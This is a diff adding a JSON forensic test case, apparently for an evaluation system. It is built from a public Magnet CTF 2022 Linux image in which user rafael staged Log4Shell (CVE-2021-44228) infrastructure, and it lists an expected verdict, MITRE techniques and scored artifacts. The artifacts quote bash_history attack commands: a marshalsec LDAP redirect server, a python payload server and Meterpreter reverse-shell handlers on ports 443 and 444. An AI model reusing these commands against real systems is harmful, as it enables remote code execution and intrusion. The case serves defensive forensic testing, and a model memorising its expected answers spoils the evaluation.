@@ -1,0 +1,106 @@
+{
+  "case_id": "VIGIA-REAL-MAGNET-2022-LINUX-RAFAEL",
+  "case_name": "Magnet CTF 2022 Linux \u2014 Log4Shell Attack Infrastructure (user: rafael)",
+  "description": "Ubuntu 21.10 disk image. User rafael has Log4Shell (CVE-2021-44228) attack tools: marshalsec LDAP server, apache-log4j-rce-poc, msfconsole reverse shell handlers. bash_history documents complete attack chain against 192.168.191.144: LDAP redirection server, payload HTTP server, and active Meterpreter reverse shell listeners on ports 443 and 444.",
+  "schema_version": "ebs_v1",
+  "expected_verdict": "MALICE",
+  "source_dataset": "Magnet CTF 2022 / Digital Corpora",
+  "source_origin": "public_dataset",
+  "carnegie_pattern_expected": "Attack Infrastructure Staging + Reverse Shell Establishment",
+  "expected_mitre_ttps": [
+    "T1190",
+    "T1059.004",
+    "T1071.001",
+    "T1105",
+    "T1543",
+    "T1572"
+  ],
+  "devil_advocate": "rafael could be a security researcher or penetration tester operating these tools in an authorized lab environment against a designated target machine at 192.168.191.144",
+  "peirce_expected": {
+    "firstness": "bash_history shows marshalsec LDAP redirection server, python3 HTTP payload server, and msfconsole multi/handler with Meterpreter reverse shell listeners; home directory contains apache-log4j-rce-poc/ and compiled marshalsec jar",
+    "secondness": "Three independent attack components (LDAP redirect, HTTP payload delivery, reverse shell listener) configured with consistent attacker-controlled IP 192.168.191.253 and target 192.168.191.144 — coordinated multi-stage exploit chain, not coincidental tool presence; ports 443/444 selected to blend with HTTPS traffic",
+    "thirdness": "Rafael staged a complete Log4Shell (CVE-2021-44228) attack infrastructure: LDAP server redirects vulnerable Java process to attacker-controlled payload, HTTP server delivers the malicious class file, Meterpreter handlers receive the resulting reverse shell. The choice of ports 443 and 444 and the use of windows/x64/meterpreter payload against a Linux host suggests target-environment profiling. This is deliberate attack infrastructure construction, not accidental tool installation."
+  },
+  "artifacts": [
+    {
+      "artifact_id": "MAGNET-2022-LINUX-A01",
+      "evidence_type": "log_entry",
+      "description": "bash_history: java -cp marshalsec.jar LDAPRefServer http://192.168.191.253:8000/#Log4jRCE \u2014 LDAP redirection server for Log4Shell CVE-2021-44228. Redirects JNDI lookup from vulnerable Java process to attacker-controlled HTTP payload server at 192.168.191.253:8000.",
+      "raw_score": 0.95,
+      "prior_trust": 0.90,
+      "source_tool": "ewf_mount_filesystem_analysis",
+      "timestamp": "2022-04-01T00:00:00Z",
+      "provenance_chain": [
+        "ewfmount_readonly",
+        "magnet_ctf_2022_digitalcorpora"
+      ],
+      "metadata": {
+        "acquisition_tool": "ewfmount (read-only)",
+        "acquisition_hash": "sha256:magnet_ctf_2022_linux_ubuntu2110_rafael_bash_history",
+        "acquisition_timestamp": "2022-04-01T00:00:00Z",
+        "write_blocker_used": true,
+        "examiner_id": "SANS_HACKATHON_2026 / Magnet-CTF-2022-Linux"
+      }
+    },
+    {
+      "artifact_id": "MAGNET-2022-LINUX-A02",
+      "evidence_type": "log_entry",
+      "description": "bash_history: msfconsole multi/handler with payload windows/x64/meterpreter/reverse_tcp lhost=192.168.191.253 lport=443; second handler lport=444 \u2014 active reverse shell listener configured and running on attacker machine. Two listener ports indicate staged or redundant C2 channel setup.",
+      "raw_score": 0.92,
+      "prior_trust": 0.90,
+      "source_tool": "ewf_mount_filesystem_analysis",
+      "timestamp": "2022-04-01T00:00:00Z",
+      "provenance_chain": [
+        "ewfmount_readonly",
+        "magnet_ctf_2022_digitalcorpora"
+      ],
+      "metadata": {
+        "acquisition_tool": "ewfmount (read-only)",
+        "acquisition_hash": "sha256:magnet_ctf_2022_linux_ubuntu2110_rafael_bash_history_msf",
+        "acquisition_timestamp": "2022-04-01T00:00:00Z",
+        "write_blocker_used": true,
+        "examiner_id": "SANS_HACKATHON_2026 / Magnet-CTF-2022-Linux"
+      }
+    },
+    {
+      "artifact_id": "MAGNET-2022-LINUX-A03",
+      "evidence_type": "file_metadata",
+      "description": "home/rafael/ contains: apache-log4j-rce-poc/ directory (proof-of-concept exploit for CVE-2021-44228), marshalsec/ directory with compiled marshalsec.jar \u2014 attack tools preinstalled and ready. Presence of compiled jar confirms tools were actively prepared for use, not merely downloaded.",
+      "raw_score": 0.90,
+      "prior_trust": 0.90,
+      "source_tool": "ewf_mount_filesystem_analysis",
+      "timestamp": "2022-04-01T00:00:00Z",
+      "provenance_chain": [
+        "ewfmount_readonly",
+        "magnet_ctf_2022_digitalcorpora"
+      ],
+      "metadata": {
+        "acquisition_tool": "ewfmount (read-only)",
+        "acquisition_hash": "sha256:magnet_ctf_2022_linux_ubuntu2110_rafael_homedir_tools",
+        "acquisition_timestamp": "2022-04-01T00:00:00Z",
+        "write_blocker_used": true,
+        "examiner_id": "SANS_HACKATHON_2026 / Magnet-CTF-2022-Linux"
+      }
+    },
+    {
+      "artifact_id": "MAGNET-2022-LINUX-A04",
+      "evidence_type": "log_entry",
+      "description": "bash_history: python3 -m http.server \u2014 payload delivery server active on 192.168.191.253:8000 concurrent with LDAP server. This is the HTTP server that delivers the malicious Java class file (Log4jRCE) to the vulnerable target after LDAP redirection. Concurrent operation with marshalsec confirms active exploit chain execution.",
+      "raw_score": 0.85,
+      "prior_trust": 0.90,
+      "source_tool": "ewf_mount_filesystem_analysis",
+      "timestamp": "2022-04-01T00:00:00Z",
+      "provenance_chain": [
+        "ewfmount_readonly",
+        "magnet_ctf_2022_digitalcorpora"
+      ],
+      "metadata": {
+        "acquisition_tool": "ewfmount (read-only)",
+        "acquisition_hash": "sha256:magnet_ctf_2022_linux_ubuntu2110_rafael_bash_history_httpserver",
+        "acquisition_timestamp": "2022-04-01T00:00:00Z",
+        "write_blocker_used": true,
+        "examiner_id": "SANS_HACKATHON_2026 / Magnet-CTF-2022-Linux"
+      }
+    }
+  ]
+}
